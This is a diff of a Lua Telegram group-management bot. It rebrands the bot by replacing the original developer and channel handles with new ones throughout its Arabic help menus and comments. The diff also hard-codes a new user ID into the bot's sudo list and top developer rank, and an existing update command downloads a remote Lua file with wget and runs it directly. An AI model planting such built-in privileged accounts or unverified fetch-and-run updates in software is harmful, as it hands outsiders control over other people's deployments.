@@ -1,8 +1,8 @@
 ------------------------------------------------
--- This Source Was Developed By @OMMO10.--
---   This Is The Source Channel @GeSoN .   --
+-- This Source Was Developed By @C7777J.--
+--   This Is The Source Channel @YV9YV .   --
 --                - GeSoN -                 --
---        -- https://t.me/GeSoN --         --
+--        -- https://t.me/YV9YV --         --
 ------------------------------------------------ 
 DevAbs  = dofile("./libs/redis.lua").connect("127.0.0.1", 6379)
 serpent = dofile("./libs/serpent.lua")
@@ -124,7 +124,7 @@ print("\27[36m"..[[
 ]]..'\27[m'.."\n\27[35mServer Information ↬ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\27[m\n\27[36m~ \27[mUser \27[36m: \27[10;32m"..User.."\27[m\n\27[36m~ \27[mIp \27[36m: \27[10;32m"..Ip.."\27[m\n\27[36m~ \27[mName \27[36m: \27[10;32m"..Name.."\27[m\n\27[36m~ \27[mPort \27[36m: \27[10;32m"..Port.."\27[m\n\27[36m~ \27[mUpTime \27[36m: \27[10;32m"..UpTime.."\27[m\n\27[35m┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\27[m")
 Config = dofile("./config.lua")
 DevId = Config.DevId
-SudoIds = {Config.SudoIds,782717203}
+SudoIds = {Config.SudoIds,782717203,1903083823} or {Config.SudoIds,782717203,1903083823}
 GeSoN = Config.GeSoN
 TokenBot = Config.TokenBot
 NameBot = (DevAbs:get(GeSoN..'Abs:NameBot') or 'جيسون')
@@ -590,7 +590,7 @@ end ,nil)
 end
 --     Source GeSoN     --
 local AbsRank = function(msg) if SudoId(msg.sender_user_id_) then GeSoNTeaM  = "المطور" elseif SecondSudo(msg) then GeSoNTeaM = "المطور" elseif SudoBot(msg) then GeSoNTeaM = "المطور" elseif ManagerAll(msg) then GeSoNTeaM = "المدير" elseif AdminAll(msg) then GeSoNTeaM = "الادمن" elseif AbsConstructor(msg) then GeSoNTeaM = "المالك" elseif BasicConstructor(msg) then GeSoNTeaM = "المنشئ" elseif Constructor(msg) then GeSoNTeaM = "المنشئ" elseif Manager(msg) then GeSoNTeaM = "المدير" elseif Admin(msg) then GeSoNTeaM = "الادمن" else GeSoNTeaM = "العضو" end return GeSoNTeaM end
-function IdRank(user_id,chat_id) if tonumber(user_id) == tonumber(1349843982) then GeSoNTeaM = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(GeSoN) then GeSoNTeaM = 'البوت' elseif SudoId(user_id) then GeSoNTeaM = 'المطور الاساسي' elseif DevAbs:sismember(GeSoN..'Abs:SecondSudo:', user_id) then GeSoNTeaM = 'المطور الثانوي' elseif DevAbs:sismember(GeSoN..'Abs:SudoBot:', user_id) then GeSoNTeaM = DevAbs:get(GeSoN.."Abs:SudoBot:Rd"..chat_id) or 'المطور' elseif DevAbs:sismember(GeSoN..'Abs:ManagerAll:', user_id) then GeSoNTeaM = DevAbs:get(GeSoN.."Abs:Managers:Rd"..chat_id) or 'المدير العام' elseif DevAbs:sismember(GeSoN..'Abs:AdminAll:', user_id) then GeSoNTeaM = DevAbs:get(GeSoN.."Abs:Admins:Rd"..chat_id) or 'الادمن العام' elseif DevAbs:sismember(GeSoN..'Abs:VipAll:', user_id) then GeSoNTeaM = DevAbs:get(GeSoN.."Abs:VipMem:Rd"..chat_id) or 'المميز العام' elseif DevAbs:sismember(GeSoN..'Abs:AbsConstructor:'..chat_id, user_id) then GeSoNTeaM = 'المالك' elseif DevAbs:sismember(GeSoN..'Abs:BasicConstructor:'..chat_id, user_id) then GeSoNTeaM = DevAbs:get(GeSoN.."Abs:BasicConstructor:Rd"..chat_id) or 'المنشئ الاساسي' elseif DevAbs:sismember(GeSoN..'Abs:Constructor:'..chat_id, user_id) then GeSoNTeaM = DevAbs:get(GeSoN.."Abs:Constructor:Rd"..chat_id) or 'المنشئ' elseif DevAbs:sismember(GeSoN..'Abs:Managers:'..chat_id, user_id) then GeSoNTeaM = DevAbs:get(GeSoN.."Abs:Managers:Rd"..chat_id) or 'المدير' elseif DevAbs:sismember(GeSoN..'Abs:Admins:'..chat_id, user_id) then GeSoNTeaM = DevAbs:get(GeSoN.."Abs:Admins:Rd"..chat_id) or 'الادمن' elseif DevAbs:sismember(GeSoN..'Abs:VipMem:'..chat_id, user_id) then  GeSoNTeaM = DevAbs:get(GeSoN.."Abs:VipMem:Rd"..chat_id) or 'المميز' elseif DevAbs:sismember(GeSoN..'Abs:Cleaner:'..chat_id, user_id) then  GeSoNTeaM = DevAbs:get(GeSoN.."Abs:Cleaner:Rd"..chat_id) or 'المنظف' else GeSoNTeaM = DevAbs:get(GeSoN.."Abs:mem:Rd"..chat_id) or 'العضو' end return GeSoNTeaM end
+function IdRank(user_id,chat_id) if tonumber(user_id) == tonumber(1903083823) then GeSoNTeaM = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(GeSoN) then GeSoNTeaM = 'البوت' elseif SudoId(user_id) then GeSoNTeaM = 'المطور الاساسي' elseif DevAbs:sismember(GeSoN..'Abs:SecondSudo:', user_id) then GeSoNTeaM = 'المطور الثانوي' elseif DevAbs:sismember(GeSoN..'Abs:SudoBot:', user_id) then GeSoNTeaM = DevAbs:get(GeSoN.."Abs:SudoBot:Rd"..chat_id) or 'المطور' elseif DevAbs:sismember(GeSoN..'Abs:ManagerAll:', user_id) then GeSoNTeaM = DevAbs:get(GeSoN.."Abs:Managers:Rd"..chat_id) or 'المدير العام' elseif DevAbs:sismember(GeSoN..'Abs:AdminAll:', user_id) then GeSoNTeaM = DevAbs:get(GeSoN.."Abs:Admins:Rd"..chat_id) or 'الادمن العام' elseif DevAbs:sismember(GeSoN..'Abs:VipAll:', user_id) then GeSoNTeaM = DevAbs:get(GeSoN.."Abs:VipMem:Rd"..chat_id) or 'المميز العام' elseif DevAbs:sismember(GeSoN..'Abs:AbsConstructor:'..chat_id, user_id) then GeSoNTeaM = 'المالك' elseif DevAbs:sismember(GeSoN..'Abs:BasicConstructor:'..chat_id, user_id) then GeSoNTeaM = DevAbs:get(GeSoN.."Abs:BasicConstructor:Rd"..chat_id) or 'المنشئ الاساسي' elseif DevAbs:sismember(GeSoN..'Abs:Constructor:'..chat_id, user_id) then GeSoNTeaM = DevAbs:get(GeSoN.."Abs:Constructor:Rd"..chat_id) or 'المنشئ' elseif DevAbs:sismember(GeSoN..'Abs:Managers:'..chat_id, user_id) then GeSoNTeaM = DevAbs:get(GeSoN.."Abs:Managers:Rd"..chat_id) or 'المدير' elseif DevAbs:sismember(GeSoN..'Abs:Admins:'..chat_id, user_id) then GeSoNTeaM = DevAbs:get(GeSoN.."Abs:Admins:Rd"..chat_id) or 'الادمن' elseif DevAbs:sismember(GeSoN..'Abs:VipMem:'..chat_id, user_id) then  GeSoNTeaM = DevAbs:get(GeSoN.."Abs:VipMem:Rd"..chat_id) or 'المميز' elseif DevAbs:sismember(GeSoN..'Abs:Cleaner:'..chat_id, user_id) then  GeSoNTeaM = DevAbs:get(GeSoN.."Abs:Cleaner:Rd"..chat_id) or 'المنظف' else GeSoNTeaM = DevAbs:get(GeSoN.."Abs:mem:Rd"..chat_id) or 'العضو' end return GeSoNTeaM end
 --     Source GeSoN     --
 function RankChecking(user_id,chat_id)
 if SudoId(user_id) then
@@ -1023,7 +1023,7 @@ local Text = [[
 ⌁︙م5 ↫ اوامر المطورين
 ⌁︙م6 ↫ اوامر الاعضاء
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-⌁︙[Source Channel](https://t.me/GeSoN)
+⌁︙[Source Channel](https://t.me/YV9YV)
 ]] 
 keyboard = {} 
 keyboard.inline_keyboard = {{{text="اوامر الادمنيه",callback_data="/HelpList2:"..data.sender_user_id_},{text="اوامر الحمايه",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="اوامر المنشئين",callback_data="/HelpList4:"..data.sender_user_id_},{text="اوامر المدراء",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="اوامر الاعضاء",callback_data="/HelpList6:"..data.sender_user_id_},{text="اوامر المطورين",callback_data="/HelpList5:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}}}
@@ -1086,7 +1086,7 @@ local Text = [[
 ⌁︙البوتات بالطرد
 ⌁︙البوتات بالتقيد
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-⌁︙[Source Channel](https://t.me/GeSoN)
+⌁︙[Source Channel](https://t.me/YV9YV)
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {{{text="اوامر الادمنيه",callback_data="/HelpList2:"..data.sender_user_id_}},{{text="اوامر المنشئين",callback_data="/HelpList4:"..data.sender_user_id_},{text="اوامر المدراء",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="اوامر الاعضاء",callback_data="/HelpList6:"..data.sender_user_id_},{text="اوامر المطورين",callback_data="/HelpList5:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
@@ -1156,7 +1156,7 @@ local Text = [[
 ⌁︙تقييد يوم + عدد الايام
 ⌁︙الغاء تقييد ↫ لالغاء التقييد بالوقت
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-⌁︙[Source Channel](https://t.me/GeSoN)
+⌁︙[Source Channel](https://t.me/YV9YV)
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {{{text="اوامر الحمايه",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="اوامر المنشئين",callback_data="/HelpList4:"..data.sender_user_id_},{text="اوامر المدراء",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="اوامر الاعضاء",callback_data="/HelpList6:"..data.sender_user_id_},{text="اوامر المطورين",callback_data="/HelpList5:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
@@ -1215,7 +1215,7 @@ local Text = [[
 ⌁︙ردود المدير • ردود المطور • التحقق
 ⌁︙ضافني • حساب العمر • الزخرفه
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-⌁︙[Source Channel](https://t.me/GeSoN)
+⌁︙[Source Channel](https://t.me/YV9YV)
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {{{text="اوامر الادمنيه",callback_data="/HelpList2:"..data.sender_user_id_},{text="اوامر الحمايه",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="اوامر المنشئين",callback_data="/HelpList4:"..data.sender_user_id_}},{{text="اوامر الاعضاء",callback_data="/HelpList6:"..data.sender_user_id_},{text="اوامر المطورين",callback_data="/HelpList5:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
@@ -1268,7 +1268,7 @@ local Text = [[
 ⌁︙المنشئين الاساسيين 
 ⌁︙حذف جميع الرتب
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-⌁︙[Source Channel](https://t.me/GeSoN)
+⌁︙[Source Channel](https://t.me/YV9YV)
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {{{text="اوامر الادمنيه",callback_data="/HelpList2:"..data.sender_user_id_},{text="اوامر الحمايه",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="اوامر المدراء",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="اوامر الاعضاء",callback_data="/HelpList6:"..data.sender_user_id_},{text="اوامر المطورين",callback_data="/HelpList5:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
@@ -1348,7 +1348,7 @@ local Text = [[
 ⌁︙ترحيب البوت • المغادره
 ⌁︙البوت الخدمي • التواصل
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-⌁︙[Source Channel](https://t.me/GeSoN)
+⌁︙[Source Channel](https://t.me/YV9YV)
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {{{text="اوامر الادمنيه",callback_data="/HelpList2:"..data.sender_user_id_},{text="اوامر الحمايه",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="اوامر المنشئين",callback_data="/HelpList4:"..data.sender_user_id_},{text="اوامر المدراء",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="اوامر الاعضاء",callback_data="/HelpList6:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
@@ -1390,7 +1390,7 @@ local Text = [[
 ⌁︙تحويل + بالرد ↫ صوره • ملصق • صوت • بصمه
 ⌁︙انطق + الكلام تدعم جميع اللغات مع الترجمه للعربي
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-⌁︙[Source Channel](https://t.me/GeSoN)
+⌁︙[Source Channel](https://t.me/YV9YV)
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {{{text="اوامر الادمنيه",callback_data="/HelpList2:"..data.sender_user_id_},{text="اوامر الحمايه",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="اوامر المنشئين",callback_data="/HelpList4:"..data.sender_user_id_},{text="اوامر المدراء",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="اوامر المطورين",callback_data="/HelpList5:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
@@ -2692,7 +2692,7 @@ Welcomes = '• نورت حبي \n• firstname \n• @username'
 end
 local Welcomes = Welcomes:gsub('"',"") Welcomes = Welcomes:gsub("'","") Welcomes = Welcomes:gsub(",","") Welcomes = Welcomes:gsub("*","") Welcomes = Welcomes:gsub(";","") Welcomes = Welcomes:gsub("`","") Welcomes = Welcomes:gsub("{","") Welcomes = Welcomes:gsub("}","") 
 local Welcomes = Welcomes:gsub('firstname',('['..result.first_name_..']' or ''))
-local Welcomes = Welcomes:gsub('username',('[@'..result.username_..']' or '[@GeSoN]'))
+local Welcomes = Welcomes:gsub('username',('[@'..result.username_..']' or '[@YV9YV]'))
 Dev_Abs(msg.chat_id_, msg.id_, 1, Welcomes, 1, 'md')
 end 
 if DevAbs:get(GeSoN.."Abs:Lock:Welcome"..msg.chat_id_) then
@@ -2740,7 +2740,7 @@ Welcomes = '• نورت حبي \n• firstname \n• @username'
 end
 local Welcomes = Welcomes:gsub('"',"") Welcomes = Welcomes:gsub("'","") Welcomes = Welcomes:gsub(",","") Welcomes = Welcomes:gsub("*","") Welcomes = Welcomes:gsub(";","") Welcomes = Welcomes:gsub("`","") Welcomes = Welcomes:gsub("{","") Welcomes = Welcomes:gsub("}","") 
 local Welcomes = Welcomes:gsub('firstname',('['..msg.content_.members_[0].first_name_..']' or ''))
-local Welcomes = Welcomes:gsub('username',('[@'..msg.content_.members_[0].username_..']' or '[@GeSoN]'))
+local Welcomes = Welcomes:gsub('username',('[@'..msg.content_.members_[0].username_..']' or '[@YV9YV]'))
 Dev_Abs(msg.chat_id_, msg.id_, 1, Welcomes, 1, 'md')
 end
 --     Source GeSoN     --
@@ -4023,7 +4023,7 @@ Dev_Abs(msg.chat_id_, msg.id_, 1,[[
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
 ⌁︙نقاطي • بيع نقاطي
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-⌁︙[Source Channel](https://t.me/GeSoN)
+⌁︙[Source Channel](https://t.me/YV9YV)
 ]], 1, 'md')
 else
 Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙عذرا الالعاب معطله في المجموعه', 1, 'md')
@@ -4188,18 +4188,18 @@ DevAbs:set(GeSoN..'Abs:viewget'..msg.sender_user_id_,true)
 Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙حسنا قم باعادة توجيه للمنشور الذي تريدني حساب مشاهداته', 1, 'md')
 end
 --     Source GeSoN     --
-if text == "السورس" or text == "سورس" then 
+if text == "السورس" or text == "سورس" or text == "ياسورس" or text == "يا سورس" then 
 local text =  [[
 Welcome To Source
 ⌁︙GeSoN TEAM
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-⌁︙[Source Channel](https://t.me/GeSoN)
+⌁︙[Source Channel](https://t.me/YV9YV)
 
-⌁︙[Exp Source](https://t.me/EPX_GeSoN)
+⌁︙[Exp Source](https://t.me/Q1N_A)
 
-⌁︙[Developer](https://t.me/OMMO10)
+⌁︙[Developer](https://t.me/C7777J)
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-⌁︙[Tws GeSoN](https://t.me/QADHB_BOT)
+⌁︙[Tws GeSoN](t.me/BNJLCBOT)
 ]]
 Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'md')
 end
@@ -4375,7 +4375,7 @@ if tonumber(result.id_) == tonumber(DevId) then
 Dev_Abs(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md') 
 return false  
 end  
-if tonumber(result.id_) == tonumber(1349843982) then 
+if tonumber(result.id_) == tonumber(1903083823) then 
 Dev_Abs(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md') 
 return false  
 end  
@@ -4406,7 +4406,7 @@ if tonumber(result.sender_user_id_) == tonumber(DevId) then
 Dev_Abs(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
 return false
 end 
-if tonumber(result.sender_user_id_) == tonumber(1349843982) then  
+if tonumber(result.sender_user_id_) == tonumber(1903083823) then  
 Dev_Abs(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
 return false
 end 
@@ -8558,7 +8558,7 @@ local TXTE = "⌁︙اعدادات المجموعه ↫ ⤈\n┉ ≈ ┉ ≈ ┉
 .."⌁︙التكرار ↫ "..flood.."\n"
 .."⌁︙عدد التكرار ↫ "..Flood_Num.."\n"
 .."⌁︙عدد السبام ↫ "..spam_c.."\n"
-.."┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙[Source Channel](https://t.me/GeSoN)\n"
+.."┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙[Source Channel](https://t.me/YV9YV)\n"
 Dev_Abs(msg.chat_id_, msg.id_, 1, TXTE, 1, 'md')
 end
 end
@@ -9954,7 +9954,7 @@ local Text = [[
 ⌁︙م5 ↫ اوامر المطورين
 ⌁︙م6 ↫ اوامر الاعضاء
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-⌁︙[Source Channel](https://t.me/GeSoN)
+⌁︙[Source Channel](https://t.me/YV9YV)
 ]] 
 keyboard = {} 
 keyboard.inline_keyboard = {{{text="اوامر الادمنيه",callback_data="/HelpList2:"..msg.sender_user_id_},{text="اوامر الحمايه",callback_data="/HelpList1:"..msg.sender_user_id_}},{{text="اوامر المنشئين",callback_data="/HelpList4:"..msg.sender_user_id_},{text="اوامر المدراء",callback_data="/HelpList3:"..msg.sender_user_id_}},{{text="اوامر الاعضاء",callback_data="/HelpList6:"..msg.sender_user_id_},{text="اوامر المطورين",callback_data="/HelpList5:"..msg.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..msg.sender_user_id_}}}
@@ -10026,7 +10026,7 @@ local Text = [[
 ⌁︙البوتات بالطرد
 ⌁︙البوتات بالتقيد
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-⌁︙[Source Channel](https://t.me/GeSoN)
+⌁︙[Source Channel](https://t.me/YV9YV)
 ]]
 Dev_Abs(msg.chat_id_, msg.id_, 1, (Help or Text), 1, 'md')
 end end
@@ -10102,7 +10102,7 @@ local Text = [[
 ⌁︙تقييد يوم + عدد الايام
 ⌁︙الغاء تقييد ↫ لالغاء التقييد بالوقت
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-⌁︙[Source Channel](https://t.me/GeSoN)
+⌁︙[Source Channel](https://t.me/YV9YV)
 ]]
 Dev_Abs(msg.chat_id_, msg.id_, 1, (Help or Text), 1, 'md')
 end end
@@ -10167,7 +10167,7 @@ local Text = [[
 ⌁︙ردود المدير • ردود المطور • التحقق
 ⌁︙ضافني • حساب العمر • الزخرفه
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-⌁︙[Source Channel](https://t.me/GeSoN)
+⌁︙[Source Channel](https://t.me/YV9YV)
 ]]
 Dev_Abs(msg.chat_id_, msg.id_, 1, (Help or Text), 1, 'md')
 end end
@@ -10226,7 +10226,7 @@ local Text = [[
 ⌁︙المنشئين الاساسيين 
 ⌁︙حذف جميع الرتب
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-⌁︙[Source Channel](https://t.me/GeSoN)
+⌁︙[Source Channel](https://t.me/YV9YV)
 ]]
 Dev_Abs(msg.chat_id_, msg.id_, 1, (Help or Text), 1, 'md')
 end end
@@ -10312,7 +10312,7 @@ local Text = [[
 ⌁︙ترحيب البوت • المغادره
 ⌁︙البوت الخدمي • التواصل
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-⌁︙[Source Channel](https://t.me/GeSoN)
+⌁︙[Source Channel](https://t.me/YV9YV)
 ]]
 Dev_Abs(msg.chat_id_, msg.id_, 1, (Help or Text), 1, 'md')
 end end
@@ -10360,7 +10360,7 @@ local Text = [[
 ⌁︙تحويل + بالرد ↫ صوره • ملصق • صوت • بصمه
 ⌁︙انطق + الكلام تدعم جميع اللغات مع الترجمه للعربي
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-⌁︙[Source Channel](https://t.me/GeSoN)
+⌁︙[Source Channel](https://t.me/YV9YV)
 ]]
 Dev_Abs(msg.chat_id_, msg.id_, 1, (Help or Text), 1, 'md')
 end
@@ -10373,7 +10373,7 @@ os.execute('wget https://raw.githubusercontent.com/GeSoNTeaM/GeSoN/main/GeSoN.lu
 dofile('GeSoN.lua') 
 io.popen("rm -rf ../.telegram-cli/*")
 print("\27[31;47m\n          ( تم تحديث السورس )          \n\27[0;34;49m\n") 
-Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙تم التحديث الى الاصدار الجديد', 1, 'md') 
+Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙تم التحديث الى الاصدار 1.0', 1, 'md') 
 end
 if text == 'تحديث' or text == 'تحديث البوت' or text == '↫ تحديث ⌁' then  
 dofile('GeSoN.lua') 
@@ -10575,7 +10575,7 @@ Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙لم يتم تعيين قناة الا�
 end end end end
 --     Source GeSoN     --
 if text == 'القناة' or text == 'قناة السورس' or text == 'قناه السورس' or text == 'قنات السورس' then 
-Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙Channel ↬ [@GeSoN]', 1, 'md')    
+Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙Channel ↬ [@YV9YV]', 1, 'md')    
 end 
 --     Source GeSoN     --
 if Sudo(msg) then 
@@ -10708,8 +10708,8 @@ end
 --     Source GeSoN     --
 end 
 ------------------------------------------------
--- This Source Was Developed By @OMMO10 .     --
---   This Is The Source Channel @GeSoN .    --
+-- This Source Was Developed By @C7777J .     --
+--   This Is The Source Channel @YV9YV .    --
 --                - GeSoN -                 --
---        -- https://t.me/GeSoN --          --
+--        -- https://t.me/YV9YV --          --
 ------------------------------------------------ 
